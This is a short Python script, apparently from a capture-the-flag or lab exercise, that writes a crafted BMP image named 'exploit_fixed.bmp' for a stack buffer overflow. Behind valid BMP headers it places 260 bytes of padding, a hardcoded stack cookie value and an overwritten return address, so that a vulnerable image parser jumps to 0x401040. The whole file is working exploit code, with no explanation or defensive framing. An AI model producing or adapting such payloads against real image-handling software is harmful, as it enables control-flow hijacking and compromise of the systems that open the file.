import struct

width = 4
height = 27
offset = 260
cookie = 0x23810ca1
ret_addr = 0x401040

payload = b"A" * offset
payload += struct.pack("<I", cookie)
payload += b"B" * 4
payload += struct.pack("<I", ret_addr)

# BMP header stuff
bfType = b'BM'
bfOffBits = 14 + 40
bfSize = bfOffBits + len(payload)
bmp_file_header = struct.pack("<2sIHHI", bfType, bfSize, 0, 0, bfOffBits)

biSize = 40
bmp_info_header = struct.pack("<IIIHHIIIIII",
    biSize, width, height,
    1, 24, 0,
    len(payload), 0, 0, 0, 0
)

with open("exploit_fixed.bmp", "wb") as f:
    f.write(bmp_file_header + bmp_info_header + payload)
